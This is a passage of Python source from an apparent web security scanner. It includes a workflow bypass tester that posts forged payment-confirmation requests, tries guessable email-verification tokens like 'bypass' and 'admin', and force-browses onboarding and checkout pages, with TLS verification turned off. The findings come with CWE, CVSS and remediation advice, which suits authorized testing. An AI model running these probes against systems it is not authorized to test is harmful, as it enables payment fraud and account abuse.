                    if resp.status_code == 200:
                        findings.append(_finding(
                            title=f"Method Bypass: {method} Allows Access to Blocked Endpoint",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-285",
                            description=(
                                f"GET {admin_ep} returns {get_resp.status_code} (blocked), "
                                f"but {method} returns 200. Authorization check is method-specific."
                            ),
                            evidence=(
                                f"GET {url} → {get_resp.status_code}\n"
                                f"{method} {url} → {resp.status_code}"
                            ),
                            remediation=(
                                "Apply authorization checks regardless of HTTP method. "
                                "Do not rely on method restrictions for security. "
                                "Use method-agnostic middleware for auth enforcement."
                            ),
                            target=url,
                            source="privilege_escalation_mapper",
                        ))
                        return findings
                except Exception:
                    continue
        except Exception:
            pass
        return findings

    def _looks_like_user_data(self, data: dict) -> bool:
        user_fields = {"email", "username", "name", "id", "user_id", "role", "phone"}
        if isinstance(data, dict):
            return bool(user_fields & set(data.keys()))
        if isinstance(data, list) and data:
            return bool(user_fields & set(data[0].keys())) if isinstance(data[0], dict) else False
        return False

    def _try_json(self, text: str) -> dict | None:
        try:
            return json.loads(text)
        except Exception:
            return None

    def _save(self, findings: list[dict]) -> Path:
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        out = self.output_dir / f"privesc_{ts}.json"
        out.write_text(json.dumps({"target": self.target, "findings": findings}, indent=2),
                       encoding="utf-8")
        return out


# ── 4. Workflow Bypass Tester ─────────────────────────────

class WorkflowBypassTester:
    """
    Test multi-step workflow bypass vulnerabilities.

    Checks:
    1. Skip payment step in checkout
    2. Access post-payment resources without paying
    3. Skip email verification
    4. Skip KYC/onboarding steps
    5. Force-browse to restricted pages
    6. Replay completed workflow steps
    """

    def __init__(
        self,
        target: str,
        output_dir: str = "./findings/business",
        token: str | None = None,
        timeout: int = 10,
    ):
        self.target     = target.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.token      = token
        self.timeout    = timeout

        self.headers = {"Content-Type": "application/json",
                        "User-Agent": "Glitchicons/2.6.0"}
        if token:
            self.headers["Authorization"] = f"Bearer {token}"

        self.client = httpx.Client(
            timeout=timeout, headers=self.headers,
            follow_redirects=True, verify=False,
        )

    def run(self) -> list[dict]:
        """Run all workflow bypass checks."""
        console.print(f"\n  [bold cyan]Workflow Bypass Tester[/bold cyan] → {self.target}")
        findings = []

        findings.extend(self._check_payment_skip())
        findings.extend(self._check_email_verify_skip())
        findings.extend(self._check_force_browse())

        self._save(findings)
        console.print(f"  Findings: [bold]{len(findings)}[/bold]")
        return findings

    def _check_payment_skip(self) -> list[dict]:
        """Test if order confirmation is accessible without payment."""
        findings = []
        confirm_eps = [
            "/api/orders/confirm", "/api/checkout/complete",
            "/api/payment/success", "/order/complete",
            "/api/v1/orders/finalize",
        ]
        for ep in confirm_eps:
            url = f"{self.target}{ep}"
            try:
                # Try to confirm order without payment
                resp = self.client.post(url, json={
                    "order_id": "ORD-12345",
                    "status":   "completed",
                    "payment_status": "paid",
                })
                if resp.status_code in (200, 201):
                    findings.append(_finding(
                        title="Workflow Bypass: Payment Step Skippable",
                        severity="CRITICAL",
                        cvss=9.1,
                        cwe="CWE-841",
                        description=(
                            "Order confirmation endpoint accessible without completing payment. "
                            "Attacker can skip payment step and claim items for free."
                        ),
                        evidence=(
                            f"Endpoint: {url}\n"
                            "Confirmed order without valid payment token\n"
                            f"HTTP {resp.status_code}"
                        ),
                        remediation=(
                            "Validate payment gateway token server-side before confirming order. "
                            "Use payment webhook pattern: gateway notifies server, not client. "
                            "Never trust client-supplied payment_status."
                        ),
                        target=url,
                        source="workflow_bypass_tester",
                    ))
                    return findings
            except Exception:
                continue
        return findings

    def _check_email_verify_skip(self) -> list[dict]:
        """Test if email verification can be skipped."""
        findings = []
        verify_eps = [
            "/api/user/verify-email", "/api/auth/verify",
            "/api/v1/auth/email/verify", "/auth/email-verify",
        ]
        for ep in verify_eps:
            url = f"{self.target}{ep}"
            for skip_token in ["bypass", "skip", "true", "1", "admin"]:
                try:
                    resp = self.client.post(url, json={
                        "token":    skip_token,
                        "verified": True,
                    })
                    if resp.status_code in (200, 201):
                        findings.append(_finding(
                            title="Workflow Bypass: Email Verification Bypassable",
                            severity="MEDIUM",
                            cvss=5.3,
                            cwe="CWE-841",
                            description=(
                                "Email verification accepted with predictable/bypass token. "
                                "Attackers can create and use accounts without owning the email."
                            ),
                            evidence=(
                                f"Endpoint: {url}\n"
                                f"Token: {skip_token} — accepted\n"
                                f"HTTP {resp.status_code}"
                            ),
                            remediation=(
                                "Use cryptographically secure verification tokens. "
                                "Token must be single-use and expire in 24 hours. "
                                "Restrict account features until email is verified."
                            ),
                            target=url,
                            source="workflow_bypass_tester",
                        ))
                        return findings
                except Exception:
                    continue
        return findings

    def _check_force_browse(self) -> list[dict]:
        """Test direct access to pages that require prior workflow steps."""
        findings = []
        restricted_paths = [
            "/dashboard", "/profile/complete",
            "/onboarding/step-3", "/payment/success",
            "/checkout/complete", "/kyc/approved",
        ]
        for path in restricted_paths:
            url = f"{self.target}{path}"
            try:
                resp = self.client.get(url)
                if resp.status_code == 200:
                    # Check if it's actually meaningful content
                    if len(resp.text) > 500 and "login" not in resp.text.lower():
                        findings.append(_finding(
                            title=f"Workflow Bypass: Force Browse to {path}",
                            severity="MEDIUM",
                            cvss=5.3,
                            cwe="CWE-425",
                            description=(
                                f"Direct access to {path} returned meaningful content "
                                "without completing prior workflow steps."
                            ),
                            evidence=f"URL: {url}\nHTTP 200\nContent length: {len(resp.text)}",
                            remediation=(
                                "Implement server-side workflow state validation. "
                                "Check prerequisite steps server-side on each page load. "
                                "Redirect to appropriate step if prerequisites not met."
                            ),
                            target=url,
                            source="workflow_bypass_tester",
                        ))
                        return findings
            except Exception:
                continue
        return findings

    def _save(self, findings: list[dict]) -> Path:
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        out = self.output_dir / f"workflow_{ts}.json"
        out.write_text(json.dumps({"target": self.target, "findings": findings}, indent=2),
                       encoding="utf-8")
        return out
